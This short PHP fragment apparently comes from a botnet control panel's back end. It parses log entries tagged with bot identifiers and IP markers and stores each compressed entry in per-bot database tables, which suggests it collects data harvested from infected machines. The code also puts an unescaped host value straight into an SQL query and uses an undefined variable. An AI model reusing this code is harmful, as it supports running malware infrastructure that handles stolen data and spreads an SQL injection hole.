<?php

preg_match_all('~#BOTSTART#(.*):(.*)#BOTNIP#(.*?)#BOTEND#~isU', $log, $match, PREG_SET_ORDER);

unset($log);

//gzdeflate('#BOTSTART#'.$item[1].':'.$item[2].'#BOTNIP#'."\r\n".'#START#'.$sitem[1].'#NAME#'."\r\n".$line."\r\n".'#END#'."\r\n".'#BOTEND#' . "\r\n")



if(isset($match[0])){
	foreach($match as $item){		if(!file_exists('/srv/www/vhosts/adm.piqa.in/cache/unnecessary/' . $hp)){			$mysqli->query('CREATE TABLE IF NOT EXISTS adm_unnecessary.bf_'.$hp.' LIKE adm_unnecessary.bf_unnecessary');
			file_put_contents('/srv/www/vhosts/adm.piqa.in/cache/unnecessary/' . $hp, true);
		}

		$mysqli->query("INSERT DELAYED INTO adm_unnecessary.bf_".$hp." (host, type, data) VALUES ('".$host."', '5', '".$mysqli->real_escape_string(gzdeflate($item . "[~]\r\n\r\n"))."')");
	}
}

?>